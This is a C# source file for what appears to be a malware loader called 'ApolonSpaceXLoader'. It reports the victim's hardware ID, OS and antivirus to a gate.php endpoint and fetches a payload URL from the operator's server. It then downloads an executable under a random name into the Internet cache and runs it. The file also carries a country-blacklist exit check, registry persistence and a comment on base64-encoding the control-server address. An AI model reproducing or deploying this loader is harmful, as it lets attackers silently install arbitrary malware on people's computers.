﻿using System;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.IO;

namespace ApolonSpaceXLoader
{
    class Program
    {
        private static EventWaitHandle ewh;
        private static long threadCount = 0;
        private static EventWaitHandle clearCount = new EventWaitHandle(false, EventResetMode.AutoReset);

        private static readonly string dom = Encoding.UTF8.GetString(Convert.FromBase64String("Domain"));  // use EncrDecr for encrypt your link on URL page. http://apolon.com -> aHR0cDovL2Fwb2xvbi5jb20vZ2F0ZS5waHA/
        public static string Gate = $"{dom}/gate.php?hwid={Helper.HWID()}&os={Helper.GetOSInformation()}&av={Helper.AV()}";
        public static string urlPage = string.Concat(dom, "/loader.txt");

        [MTAThread]
        static void Main(string[] args)
        {
            if (Helper.Cis(dom)) // If country in black list, application close
            {
                Environment.Exit(1);
            }
            MyRegistry.Check();
            ewh = new EventWaitHandle(false, EventResetMode.AutoReset);

            Thread t = new Thread(Work);
            t.Start();

            while (Interlocked.Read(ref threadCount) < 1)
            {
                Thread.Sleep(3000);
            }

            while (Interlocked.Read(ref threadCount) > 0)
            {
                WaitHandle.SignalAndWait(ewh, clearCount);
            }
        }

        private static void Work()
        {
            try
            {
                string rnd = Helper.RandomID(6);
                string dropPath = $"{Environment.GetFolderPath(Environment.SpecialFolder.InternetCache)}\\{rnd}.exe";

                string urlOnPage;
                using (StreamReader strr = new StreamReader(HttpWebRequest.Create(urlPage).GetResponse().GetResponseStream()))
                {
                    urlOnPage = strr.ReadToEnd();
                }

                using (WebClient wc = new WebClient())
                {
                    {
                        if (MyRegistry.GetURL() != urlOnPage)
                        {
                            if (File.Exists(dropPath))
                            {
                                File.Delete(dropPath);
                            }
                            MyRegistry.SetURL(urlOnPage);
                            if (urlOnPage.Length > 0)
                            {
                                if (MyRegistry.GetURL() != null)
                                {
                                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                                    wc.DownloadFile(new Uri(urlOnPage), dropPath);
                                    Process.Start(dropPath);
                                }
                            }
                        }
                    }
                    ewh.Set();
                    clearCount.Set();
                }
            }
            catch
            {
                ewh.Set();
                clearCount.Set();
            }
        }
    }
}
